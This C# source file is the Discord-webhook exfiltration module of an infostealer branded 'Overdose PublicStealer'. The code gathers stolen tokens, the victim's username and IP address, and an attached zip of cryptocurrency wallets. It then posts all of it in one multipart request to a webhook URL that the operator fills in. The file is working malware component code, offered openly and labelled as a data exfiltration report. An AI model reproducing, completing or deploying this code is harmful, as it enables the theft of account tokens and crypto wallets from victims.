using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net; // Necesario para HttpWebRequest
using System.Text; // Necesario para Encoding
using System.Text.Json; // Para serializar el JSON
using System.Threading.Tasks;
using OdPS.Utils;
using OdPS.Models; // Import models for the webhook structure

namespace OdPS
{
    internal static class WHS // WebhookSender
    {
        // Webhook URL where data will be sent. Make sure to replace this with your own webhook URL.
        private static readonly string webhookUrl = "HERE_UR_WEBHOOK";

        /// <summary>
        /// Sends a combined report including stolen tokens, wallet zip
        /// to the Discord webhook in a single multipart request.
        /// </summary>
        /// <param name="tokens">A list of stolen tokens.</param>
        /// <param name="walletZipPath">The file path to the wallet zip archive. Can be null.</param>
        internal static async Task SendCombinedReport(List<string> tokens, string walletZipPath)
        {
            // Create the webhook payload object
            var payload = new WebhookPayload
            {
                Username = "Overdose PublicStealer", // Custom username for the webhook message
                AvatarUrl = WebhookPayload.DefaultAvatarUrl, // Use the static DefaultAvatarUrl from the model
                Embeds = new List<Embed>() // Initialize the embeds list
            };

            // Create a new embed object that will be sent as a part of the webhook payload
            var embed = new Embed
            {
                // Using pill emojis in the title
                Title = "💊 New Overdose PublicStealer Report 💊", // Title with pill emojis
                Description = "A new data exfiltration report has been generated.", // Engaging description
                Color = 0x00FF00, // Vibrant green color (you can choose another hex color)
                // Author field for branding (optional)
                Author = new EmbedAuthor
                {
                    Name = "Overdose Stealer Automated Report",
                    // IconUrl = "URL_DEL_ICONO_DEL_AUTOR" // Optional: Add an icon URL for the author
                },
                // Fields of the embed, including the username and IP address of the victim
                Fields = new List<EmbedField>
                {
                    new EmbedField { Name = "👤 Victim Username", Value = $"```{Environment.UserName}```", Inline = true }, // Added code block for username
                    new EmbedField { Name = "🌐 Victim IP Address", Value = $"```{NetworkUtils.GetIp()}```", Inline = true } // Added code block for IP
                },
                // Footer text to display at the bottom of the embed
                // Footer Text set to "Programmed by Overdose"
                Footer = new EmbedFooter { Text = "Programmed by Overdose", IconUrl = WebhookPayload.DefaultAvatarUrl }, // Added icon to footer
                Timestamp = DateTimeOffset.UtcNow, // Add a timestamp
                // EmbedImage to display a GIF within the embed using the static property
                Image = new EmbedImage { Url = WebhookPayload.DefaultEmbedImageUrl } // Use the static DefaultEmbedImageUrl from the model
                // Thumbnail (optional - smaller image on the side)
                // Thumbnail = new EmbedThumbnail { Url = "URL_DEL_THUMBNAIL" }
            };

            // Add token information to the embed
            if (tokens != null && tokens.Any())
            {
                // Field to show the count of found tokens
                embed.Fields.Add(new EmbedField { Name = "🔑 Found Tokens", Value = $"{tokens.Count}", Inline = false });

                // Add each token as a field
                for (int i = 0; i < tokens.Count; i++)
                {
                    // Discord embed field value limit is 1024 characters.
                    // Truncate long tokens if necessary, or consider sending them differently if very long.
                    string tokenValue = tokens[i];
                    if (tokenValue.Length > 1000) // Keep some buffer
                    {
                        tokenValue = tokenValue.Substring(0, 1000) + "... (truncated)";
                    }
                    embed.Fields.Add(new EmbedField
                    {
                        Name = $"Token {i + 1}", // Name of the field, representing each token
                        Value = $"```{tokenValue}```", // The token value itself, enclosed in code block for formatting
                        Inline = false // Each token on a new line
                    });
                }
            }
            else
            {
                // If no tokens were found, add a message stating that
                embed.Fields.Add(new EmbedField { Name = "🔑 Tokens", Value = "No tokens found.", Inline = false });
            }

            // Add wallet information to the embed
            if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
            {
                embed.Color = 0x3498DB; // Change color to blue if wallets are included
                embed.Fields.Add(new EmbedField { Name = "📂 Wallets", Value = "Wallet files are attached.", Inline = false });
            }
            else
            {
                embed.Fields.Add(new EmbedField { Name = "📂 Wallets", Value = "No wallets found.", Inline = false });
            }

            // Add the created embed to the payload's embeds list
            payload.Embeds.Add(embed);

            // Serialize the payload object into JSON format
            var jsonPayload = JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = false }); // No indentation for smaller payload

            // --- Inicio de la implementación con HttpWebRequest ---

            // Genera un límite único para el formulario multipart
            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n");
            byte[] finalBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(webhookUrl);
            request.Method = "POST";
            request.ContentType = "multipart/form-data; boundary=" + boundary;
            request.KeepAlive = true; // Mantener la conexión abierta

            try
            {
                using (var requestStream = await request.GetRequestStreamAsync())
                {
                    // 1. Añadir la parte JSON (payload_json)
                    await requestStream.WriteAsync(boundaryBytes, 0, boundaryBytes.Length);
                    string jsonHeader = $"Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json; charset=utf-8\r\n\r\n";
                    byte[] jsonHeaderBytes = Encoding.UTF8.GetBytes(jsonHeader);
                    await requestStream.WriteAsync(jsonHeaderBytes, 0, jsonHeaderBytes.Length);

                    byte[] jsonContentBytes = Encoding.UTF8.GetBytes(jsonPayload);
                    await requestStream.WriteAsync(jsonContentBytes, 0, jsonContentBytes.Length);

                    // 2. Añadir el archivo si existe (wallet_file)
                    if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
                    {
                        try
                        {
                            Console.WriteLine($"Attaching wallet file: {Path.GetFileName(walletZipPath)}");

                            await requestStream.WriteAsync(boundaryBytes, 0, boundaryBytes.Length);
                            string fileHeader = $"Content-Disposition: form-data; name=\"wallet_file\"; filename=\"{Path.GetFileName(walletZipPath)}\"\r\nContent-Type: application/octet-stream\r\n\r\n";
                            byte[] fileHeaderBytes = Encoding.UTF8.GetBytes(fileHeader);
                            await requestStream.WriteAsync(fileHeaderBytes, 0, fileHeaderBytes.Length);

                            // Escribir el contenido del archivo
                            using (var fileStream = File.OpenRead(walletZipPath))
                            {
                                await fileStream.CopyToAsync(requestStream);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error reading wallet zip file for attachment: {ex.Message}");
                            // No lanzar la excepción, continuar para intentar enviar el webhook sin el archivo
                        }
                    }

                    // 3. Añadir el límite final del formulario multipart
                    await requestStream.WriteAsync(finalBoundaryBytes, 0, finalBoundaryBytes.Length);
                } // El requestStream se cierra y se vacía (flush) automáticamente al salir del using

                // Obtener la respuesta de forma asíncrona
                using (WebResponse response = await request.GetResponseAsync())
                {
                    HttpWebResponse httpResponse = (HttpWebResponse)response;
                    if (httpResponse.StatusCode == HttpStatusCode.OK || httpResponse.StatusCode == HttpStatusCode.NoContent)
                    {
                        Console.WriteLine("Combined webhook sent successfully.");
                    }
                    else
                    {
                        // Leer el cuerpo de la respuesta en caso de error
                        using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                        {
                            string responseBody = await reader.ReadToEndAsync();
                            Console.WriteLine($"Error sending combined webhook: {httpResponse.StatusCode} - {responseBody}");
                        }
                    }
                }
            }
            catch (WebException ex)
            {
                // Manejar errores de red o del servidor
                Console.WriteLine($"Error de red al enviar webhook: {ex.Status} - {ex.Message}");
                if (ex.Response != null)
                {
                    using (StreamReader reader = new StreamReader(ex.Response.GetResponseStream()))
                    {
                        string errorResponse = await reader.ReadToEndAsync();
                        Console.WriteLine($"Detalles del error del servidor: {errorResponse}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error inesperado al enviar webhook: {ex.Message}");
            }
            // --- Fin de la implementación con HttpWebRequest ---
        }

        // Note: The helper classes (WebhookPayload, Embed, EmbedField, EmbedFooter, EmbedImage, EmbedAuthor, EmbedThumbnail)
        // and NetworkUtils are assumed to be defined in separate files (e.g., Models.cs and Utils.cs)
        // within the OdPS.Models and OdPS.Utils namespaces, respectively,
        // as indicated by the using directives.
        // You will need to ensure EmbedAuthor and EmbedThumbnail classes are in your Models.cs file.
    }
}
